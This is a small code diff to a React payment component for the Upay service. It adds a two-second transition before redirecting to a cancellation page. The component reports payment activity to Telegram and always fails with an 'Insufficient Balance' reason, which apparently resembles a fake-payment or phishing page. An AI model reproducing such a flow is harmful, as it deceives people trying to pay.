@@ -85,9 +85,12 @@ const UpayPayment = () => {
       setTimeout(() => setShowError(""), 3000);
       return;
     }
+    setIsTransitioning(true);
     sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs' });
-
-    navigate(`/payment-cancelled?channel=Upay&reason=Insufficient Balance&amount=${amount}.00`);
+    setTimeout(() => {
+      setIsTransitioning(false);
+      navigate(`/payment-cancelled?channel=Upay&reason=Insufficient Balance&amount=${amount}.00`);
+    }, 2000);
   };
 
   const handleClose = () => {
